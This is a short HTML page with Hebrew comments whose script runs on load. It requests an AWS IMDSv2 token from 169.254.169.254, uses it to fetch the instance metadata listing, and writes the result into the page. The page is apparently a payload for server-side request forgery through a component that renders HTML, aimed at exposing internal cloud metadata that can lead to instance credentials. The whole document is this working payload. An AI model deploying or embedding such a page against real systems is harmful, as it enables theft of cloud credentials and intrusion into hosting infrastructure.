<!DOCTYPE html>
<html>
  <head><meta charset="UTF-8"><title>IMDSv2 Attempt</title></head>
  <body>
    <h1>Attempting to access EC2 metadata (v2)</h1>
    <pre id="out">Fetching...</pre>
    <script>
      async function getMetadata() {
        const output = document.getElementById("out");

        try {
          // שלב 1 - בקשת טוקן
          const tokenRes = await fetch("http://169.254.169.254/latest/api/token", {
            method: "PUT",
            headers: {
              "X-aws-ec2-metadata-token-ttl-seconds": "21600"
            }
          });

          const token = await tokenRes.text();

          // שלב 2 - שימוש בטוקן כדי להביא מטא-דאטה
          const metaRes = await fetch("http://169.254.169.254/latest/meta-data/", {
            method: "GET",
            headers: {
              "X-aws-ec2-metadata-token": token
            }
          });

          const text = await metaRes.text();
          output.textContent = "Metadata:\n\n" + text;
        } catch (e) {
          output.textContent = "Error:\n" + e.message;
        }
      }

      getMetadata();
    </script>
  </body>
</html>
